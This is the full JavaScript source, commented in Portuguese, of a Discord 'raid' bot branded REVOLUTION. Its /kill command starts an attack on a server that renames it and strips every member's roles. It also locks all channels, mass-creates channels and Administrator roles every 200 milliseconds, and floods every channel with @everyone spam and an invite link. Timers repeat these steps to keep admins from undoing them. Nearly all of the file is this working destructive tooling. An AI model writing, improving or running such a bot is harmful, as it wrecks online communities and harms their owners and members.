const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ============ CLIENT ============
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.commands = new Map();

// ============ GERENCIADOR DE ATAQUE ============
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
  }

  startAttack(guild, user, motivo, client) {
    const guildId = guild.id;
    
    if (this.activeAttacks.has(guildId)) {
      this.stopAttack(guildId);
    }

    let isRunning = true;
    let totalCanaisCriados = 0;

    // ============ 1. MUDA O NOME DO SERVIDOR ============
    const changeServerName = async () => {
      try {
        await guild.setName('REVOLUTION');
        console.log(`📛 NOME DO SERVIDOR ALTERADO PARA: REVOLUTION`);
      } catch (error) {}
    };
    changeServerName();
    const nameInterval = setInterval(() => {
      if (guild.name !== 'REVOLUTION') changeServerName();
    }, 10000);

    // ============ 2. CRIA CARGO INFERIOR PARA TODOS ============
    const createLowRole = async () => {
      try {
        const lowRoleName = 'REVOLUTION_SUB';
        let lowRole = guild.roles.cache.find(r => r.name === lowRoleName);
        if (!lowRole) {
          lowRole = await guild.roles.create({
            name: lowRoleName,
            color: '#333333',
            position: 0,
            permissions: []
          });
        }

        const members = guild.members.cache.filter(m => 
          !m.user.bot && m.id !== user.id && m.id !== client.user.id
        );

        for (const member of members.values()) {
          try {
            await member.roles.set([lowRole.id]);
          } catch (error) {}
        }

        const ownerMember = guild.members.cache.get(user.id);
        if (ownerMember) {
          const adminRole = guild.roles.cache.find(r => r.name === 'Administrador');
          if (adminRole && !ownerMember.roles.cache.has(adminRole.id)) {
            await ownerMember.roles.add(adminRole);
          }
        }
      } catch (error) {}
    };
    createLowRole();
    const rebaixamentoInterval = setInterval(createLowRole, 30000);

    // ============ 3. LOCK EM TODOS OS CANAIS ============
    const lockAllChannels = async () => {
      try {
        const channels = guild.channels.cache.filter(ch => ch.isTextBased());
        for (const channel of channels.values()) {
          try {
            await channel.permissionOverwrites.edit(guild.id, {
              SendMessages: false,
              AddReactions: false,
              CreatePublicThreads: false,
              CreatePrivateThreads: false
            });
            await channel.permissionOverwrites.edit(client.user.id, {
              SendMessages: true,
              AddReactions: true
            });
            const owner = guild.members.cache.get(user.id);
            if (owner) {
              await channel.permissionOverwrites.edit(owner.id, {
                SendMessages: true,
                AddReactions: true,
                ManageMessages: true
              });
            }
          } catch (error) {}
        }
      } catch (error) {}
    };
    lockAllChannels();
    const lockInterval = setInterval(lockAllChannels, 15000);

    // ============ 4. CRIAÇÃO MÚLTIPLA DE CANAIS (TEXTO, VOZ, FÓRUM, CATEGORIA) ============
    const channelTypes = [
      { type: ChannelType.GuildText, name: 'texto' },
      { type: ChannelType.GuildVoice, name: 'voz' },
      { type: ChannelType.GuildForum, name: 'forum' },
      { type: ChannelType.GuildCategory, name: 'categoria' }
    ];

    let counters = {
      texto: 0,
      voz: 0,
      forum: 0,
      categoria: 0
    };

    const createMultipleChannels = async () => {
      if (!isRunning) return;
      
      try {
        // Conta quantos canais de cada tipo existem
        const existingText = guild.channels.cache.filter(c => c.type === ChannelType.GuildText).size;
        const existingVoice = guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice).size;
        const existingForum = guild.channels.cache.filter(c => c.type === ChannelType.GuildForum).size;
        const existingCategory = guild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).size;

        // Se tiver mais de 50 canais de um tipo, cria do próximo
        const maxChannels = 50;

        // CRIA CATEGORIA PRIMEIRO (pra organizar)
        if (existingCategory < maxChannels) {
          try {
            const catName = `REVOLUTION-CATEGORIA-${counters.categoria + 1}`;
            const category = await guild.channels.create({
              name: catName,
              type: ChannelType.GuildCategory
            });
            counters.categoria++;
            totalCanaisCriados++;
            console.log(`📁 CATEGORIA CRIADA: ${catName}`);
            
            // Cria canais DENTRO da categoria
            for (let i = 0; i < 3; i++) {
              if (!isRunning) break;
              
              // Texto
              if (counters.texto < maxChannels) {
                const textName = `revolution-text-${counters.texto + 1}`;
                await guild.channels.create({
                  name: textName,
                  type: ChannelType.GuildText,
                  parent: category.id,
                  permissionOverwrites: [
                    {
                      id: guild.id,
                      allow: ['ViewChannel']
                    }
                  ]
                });
                counters.texto++;
                totalCanaisCriados++;
                console.log(`📝 CANAL TEXTO: ${textName}`);
              }

              // Voz
              if (counters.voz < maxChannels) {
                const voiceName = `revolution-voz-${counters.voz + 1}`;
                await guild.channels.create({
                  name: voiceName,
                  type: ChannelType.GuildVoice,
                  parent: category.id,
                  permissionOverwrites: [
                    {
                      id: guild.id,
                      allow: ['ViewChannel', 'Connect']
                    }
                  ]
                });
                counters.voz++;
                totalCanaisCriados++;
                console.log(`🎤 CANAL VOZ: ${voiceName}`);
              }

              // Fórum
              if (counters.forum < maxChannels) {
                const forumName = `revolution-forum-${counters.forum + 1}`;
                await guild.channels.create({
                  name: forumName,
                  type: ChannelType.GuildForum,
                  parent: category.id,
                  permissionOverwrites: [
                    {
                      id: guild.id,
                      allow: ['ViewChannel', 'SendMessages']
                    }
                  ]
                });
                counters.forum++;
                totalCanaisCriados++;
                console.log(`📋 FÓRUM CRIADO: ${forumName}`);
              }
            }
          } catch (error) {
            console.error(`ERRO AO CRIAR CANAIS NA CATEGORIA: ${error.message}`);
          }
        }

        // Se atingiu o limite de categorias, cria canais soltos
        if (existingCategory >= maxChannels) {
          // Cria canais soltos de texto
          if (counters.texto < maxChannels * 2) {
            const textName = `revolution-text-solto-${counters.texto + 1}`;
            await guild.channels.create({
              name: textName,
              type: ChannelType.GuildText,
              permissionOverwrites: [
                {
                  id: guild.id,
                  allow: ['ViewChannel']
                }
              ]
            });
            counters.texto++;
            totalCanaisCriados++;
            console.log(`📝 CANAL TEXTO SOLTO: ${textName}`);
          }

          // Cria canais soltos de voz
          if (counters.voz < maxChannels * 2) {
            const voiceName = `revolution-voz-solto-${counters.voz + 1}`;
            await guild.channels.create({
              name: voiceName,
              type: ChannelType.GuildVoice,
              permissionOverwrites: [
                {
                  id: guild.id,
                  allow: ['ViewChannel', 'Connect']
                }
              ]
            });
            counters.voz++;
            totalCanaisCriados++;
            console.log(`🎤 CANAL VOZ SOLTO: ${voiceName}`);
          }
        }

        if (totalCanaisCriados % 10 === 0) {
          console.log(`📊 TOTAL DE CANAIS CRIADOS: ${totalCanaisCriados}`);
        }

      } catch (error) {
        console.error(`ERRO NA CRIAÇÃO MÚLTIPLA: ${error.message}`);
      }
    };

    // Executa criação múltipla imediatamente
    createMultipleChannels();

    // Executa a cada 200ms (MUITO RÁPIDO!)
    const multiChannelInterval = setInterval(createMultipleChannels, 200);

    // ============ 5. CRIAÇÃO RÁPIDA DE CARGOS ============
    const createRole = async () => {
      if (!isRunning) return;
      try {
        await guild.roles.create({
          name: 'RAID BY REVOLUTION',
          color: '#ff0000',
          permissions: [PermissionsBitField.Flags.Administrator]
        });
      } catch (error) {}
    };

    for (let i = 0; i < 10; i++) createRole();
    const roleInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) createRole();
    }, 200);

    // ============ 6. SPAM ULTRARRÁPIDO ============
    const spamMessages = [
      `SERVIDOR TOMADO POR REVOLUTION, SAIAM DAS TREVAS\n\n${user.tag} INICIOU O ATAQUE\n\nJUNTE-SE A REVOLUTION\nhttps://discord.gg/GJAKrmDuMp\n\nhttps://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif`
    ];

    let messageCount = 0;

    const spamFunction = async () => {
      if (!isRunning) return;
      
      try {
        const channels = guild.channels.cache.filter(ch => 
          ch.isTextBased() && 
          ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
        );
        
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;

        for (const channel of channelArray.slice(0, 10)) {
          if (!isRunning) break;
          try {
            const randomMessage = spamMessages[0];
            
            const spamEmbed = new EmbedBuilder()
              .setTitle('REVOLUTION')
              .setDescription(randomMessage)
              .setColor('#ff0000')
              .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
              .setFooter({ text: 'REVOLUTION - SAIAM DAS TREVAS' })
              .setTimestamp();

            await channel.send({ 
              content: `@everyone SERVIDOR TOMADO POR REVOLUTION`,
              embeds: [spamEmbed]
            });
            messageCount++;
          } catch (error) {}
        }
        
        if (messageCount % 10 === 0) {
          console.log(`📢 SPAM #${messageCount} enviado`);
        }
      } catch (error) {}
    };

    const spamInterval = setInterval(spamFunction, 100);
    for (let i = 0; i < 5; i++) {
      setTimeout(spamFunction, i * 10);
    }

    // ============ SALVA O ATAQUE ============
    this.activeAttacks.set(guildId, {
      spamInterval,
      roleInterval,
      nameInterval,
      lockInterval,
      rebaixamentoInterval,
      multiChannelInterval,
      isRunning,
      target: guild.name,
      author: user.tag,
      startTime: new Date(),
      messageCount: 0,
      totalCanaisCriados: 0,
      stop: () => {
        isRunning = false;
        clearInterval(spamInterval);
        clearInterval(roleInterval);
        clearInterval(nameInterval);
        clearInterval(lockInterval);
        clearInterval(rebaixamentoInterval);
        clearInterval(multiChannelInterval);
        this.activeAttacks.delete(guildId);
        console.log(`🛑 ATAQUE PARADO no servidor ${guild.name}`);
        console.log(`📊 TOTAL DE CANAIS CRIADOS: ${totalCanaisCriados}`);
      }
    });

    console.log(`🔥 ATAQUE ULTRARRÁPIDO iniciado no servidor ${guild.name} por ${user.tag}`);
    return this.activeAttacks.get(guildId);
  }

  stopAttack(guildId) {
    const attack = this.activeAttacks.get(guildId);
    if (attack) {
      attack.stop();
      return true;
    }
    return false;
  }

  getStatus(guildId) {
    return this.activeAttacks.get(guildId) || null;
  }
}

const attackManager = new AttackManager();

// ============ LOGGER ============
function log(message, type = 'INFO') {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [${type}] ${message}`);
  
  const logDir = './logs';
  if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
  fs.appendFileSync(`${logDir}/bot.log`, `[${timestamp}] [${type}] ${message}\n`);
}

// ============ COMANDO: KILL ============
client.commands.set('kill', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({
        content: '❌ VOCE PRECISA SER ADMINISTRADOR NO SERVIDOR PARA ATACAR.',
        ephemeral: true
      });
    }

    const motivo = interaction.options.getString('motivo') || 'OPERACAO REVOLUTION - ATAQUE TOTAL';

    try {
      const attack = attackManager.startAttack(interaction.guild, interaction.user, motivo, client);

      const successEmbed = new EmbedBuilder()
        .setTitle('ATAQUE REVOLUTION INICIADO')
        .setColor('#ff0000')
        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE ULTRARRAPIDO`)
        .addFields(
          { name: 'ALVO', value: interaction.guild.name, inline: true },
          { name: 'MOTIVO', value: motivo, inline: true },
          { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE EM ANDAMENTO (VELOCIDADE MAXIMA)', inline: false },
          { name: 'PARAR', value: 'USE /end PARA PARAR O ATAQUE', inline: false },
          { name: 'CANAIS BLOQUEADOS', value: 'TODOS OS CANAIS ESTAO EM LOCK', inline: false },
          { name: 'USUARIOS REBAIXADOS', value: 'TODOS FORAM REBAIXADOS', inline: false },
          { name: 'CRIANDO CANAIS', value: 'TEXTO + VOZ + FORUM + CATEGORIAS', inline: false }
        )
        .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
        .setFooter({ text: 'REVOLUTION - ATAQUE ULTRARRAPIDO' })
        .setTimestamp();

      await interaction.reply({ embeds: [successEmbed] });
      log(`🔥 ATAQUE ULTRARRAPIDO iniciado por ${interaction.user.tag} no servidor ${interaction.guild.name}`);

    } catch (error) {
      await interaction.reply({ 
        content: `❌ ERRO AO INICIAR ATAQUE: ${error.message}`,
        ephemeral: true
      });
      log(`Erro no KILL: ${error.message}`, 'ERROR');
    }
  }
});

// ============ COMANDO: END ============
client.commands.set('end', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    const guildId = interaction.guild.id;
    const attack = attackManager.getStatus(guildId);
    
    if (attack) {
      attackManager.stopAttack(guildId);
      
      const embed = new EmbedBuilder()
        .setTitle('ATAQUE PARADO COM SUCESSO')
        .setColor('#00ff00')
        .setDescription('O ATAQUE REVOLUTION FOI DESATIVADO')
        .addFields(
          { name: 'PARADO POR', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE PARADO', inline: true }
        )
        .setFooter({ text: 'REVOLUTION - MODO DESATIVADO' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      log(`🛑 END executado por ${interaction.user.tag}`);
    } else {
      await interaction.reply({
        content: '❌ NENHUM ATAQUE ATIVO PARA PARAR.',
        ephemeral: true
      });
    }
  }
});

// ============ EVENTOS ============

client.on('ready', () => {
  log(`🚀 Bot ${client.user.tag} esta ONLINE!`);
  log(`📊 Servidores: ${client.guilds.cache.size}`);
  
  client.user.setPresence({
    activities: [{
      name: 'REVOLUTION | /kill para atacar',
      type: 3,
      state: 'Use /kill para ATACAR'
    }],
    status: 'online'
  });
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) {
    return interaction.reply({
      content: '❌ COMANDO NAO ENCONTRADO!',
      ephemeral: true
    });
  }

  try {
    await command.execute(interaction);
  } catch (error) {
    log(`Erro no comando ${interaction.commandName}: ${error.message}`, 'ERROR');
    
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    } else {
      await interaction.reply({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    }
  }
});

// ============ SERVIDOR WEB ============
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot Revolution esta ONLINE!');
});

app.get('/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    ataquesAtivos: attackManager.activeAttacks.size,
    servidores: client.guilds.cache.size
  });
});

app.listen(PORT, () => {
  console.log(`Servidor web rodando na porta ${PORT}`);
});

// ============ LOGIN ============

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error('TOKEN NAO ENCONTRADO! Configure o .env');
  process.exit(1);
}

client.login(TOKEN).catch(error => {
  log(`Erro ao fazer login: ${error.message}`, 'ERROR');
  process.exit(1);
});
